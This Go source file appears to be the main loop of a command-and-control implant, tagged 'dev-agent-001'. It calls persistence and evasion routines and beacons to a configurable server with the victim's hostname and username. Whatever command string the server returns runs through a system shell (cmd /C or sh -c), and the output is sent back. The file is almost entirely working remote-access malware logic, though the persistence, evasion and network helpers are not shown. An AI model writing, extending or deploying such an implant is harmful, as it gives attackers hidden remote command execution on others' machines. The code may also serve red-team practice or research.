package main

import (
	"flag"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

var (
	serverAddr = flag.String("addr", "localhost:8080", "Server address")
	AgentID    = "dev-agent-001"
	ServerAddr = "localhost:8080"
)

func main() {
	flag.Parse()
	if *serverAddr != "localhost:8080" {
		ServerAddr = *serverAddr
	}
	persist()
	evasion()
	for {
		n := activeProfile.Interval + rand.Intn(5)
		hostname, err := os.Hostname()
		if err != nil {
			log.Printf("failed to get hostname: %v", err)
			time.Sleep(time.Duration(n) * time.Second)
			continue
		}
		currentUser, err := user.Current()
		if err != nil {
			log.Printf("failed to get current user: %v", err)
			time.Sleep(time.Duration(n) * time.Second)
			continue
		}

		response, err := beaconHTTP(ServerAddr, AgentID, currentUser.Username, hostname)
		if err != nil {
			log.Printf("failed to beacon: %v", err)
			time.Sleep(time.Duration(n) * time.Second)
			continue
		}

		response = strings.TrimSpace(response)
		if response == "ACK" {
			log.Printf("beacon acknowledged")
		} else {
			var cmd *exec.Cmd
			if runtime.GOOS == "windows" {
				cmd = exec.Command("cmd", "/C", response)
			} else {
				cmd = exec.Command("sh", "-c", response)
			}
			output, err := cmd.CombinedOutput()
			if err != nil {
				log.Printf("failed to execute command: %v", err)
				time.Sleep(time.Duration(n) * time.Second)
				continue
			}
			log.Printf("command output: %s", output)
			flat := strings.ReplaceAll(string(output), "\n", " ")
			if err := sendResult(ServerAddr, AgentID, flat); err != nil {
				log.Printf("failed to send result: %v", err)
			}
		}
		time.Sleep(time.Duration(n) * time.Second)
	}
}
